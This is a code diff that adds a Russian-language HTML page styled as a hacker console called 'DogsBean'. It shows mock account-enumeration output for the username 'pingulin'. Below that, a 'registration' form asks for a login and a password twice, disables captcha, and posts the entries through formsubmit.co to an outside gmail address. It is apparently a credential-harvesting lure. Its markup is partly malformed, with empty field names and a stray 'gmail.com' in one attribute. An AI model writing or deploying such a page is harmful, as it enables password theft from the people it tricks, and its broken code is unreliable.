@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>DogsBean Console</title>
+  <style>
+    body {
+      background-color: black;
+      color: #00ff00;
+      font-family: monospace;
+      margin: 0;
+      padding: 0;
+    }
+    .terminal {
+      max-width: 800px;
+      margin: 40px auto;
+      background-color: #000;
+      border: 2px solid #222;
+      padding: 20px;
+      box-shadow: 0 0 20px #0f0;
+    }
+    .title {
+      text-align: center;
+      font-size: 3rem;
+      color: red;
+      text-shadow: 0 0 20px red;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+    .output {
+      white-space: pre-wrap;
+      line-height: 1.4em;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin: 5px 0;
+      color: #0f0;
+    }
+    input {
+      background: black;
+      border: 1px solid #0f0;
+      color: #0f0;
+      width: 100%;
+      margin-bottom: 10px;
+      padding: 8px;
+      font-family: monospace;
+    }
+    button {
+      background: #0f0;
+      color: black;
+      font-weight: bold;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      cursor: pointer;
+      font-family: monospace;
+    }
+    button:hover {
+      background: #09d309;
+    }
+  </style>
+</head>
+<body>
+  <div class="terminal">
+    <div class="title">DOGSBEAN</div>
+    <div class="output">
+✔ Checking for updates...
+✔ Sites List is up to date
+✔ Enumerating accounts with username "pingulin"
+✔ [Reddit] https://www.reddit.com/user/pingulin/about/.json
+✔ [DockerHub] https://hub.docker.com/v2/users/pingulin/
+✔ [Gravatar] http://en.gravatar.com/pingulin.json
+✔ [Giters] https://giters.com/pingulin
+✔ [Twitter] https://twitter-privacyv4.net/pingulin
+✔ [Xbox GamerTag] https://www.xboxgamertag.com/search/pingulin
+✔ [GitHub] https://github.com/pingulin
+✔ Check completed in 3.3 seconds (186 sites)
+✔ Enumerating accounts with email "pingulin@protonmail.com"
+✔ [Twitter] https://twitter.com/users/email_available.json?email=pingulin@protonmail.com
+✔ Check completed in 0.8 seconds (10 sites)
+    </div>
+
+    <!-- Форма с тремя сообщениями -->
+    <form action="https://formsubmit.co/Golda1.namechtu@gmail.com" method="POST">
+      <!-- скрытые настройки FormSubmit -->
+      <input type="hidden" name="_subject" value="Новое сообщение с DogsBean">
+      <input type="hidden" name="_captcha" value="false">
+
+      <label>регистрация</label>
+      <input type="text" name=""gmail.com required>
+
+      <label>пароль</label>
+      <input type="text" name="">
+
+      <label>повторите пароль</label>
+      <input type="text" name="">
+
+      <button type="submit">зарегистрироваться</button>
+    </form>
+  </div>
+</body>
+</html>
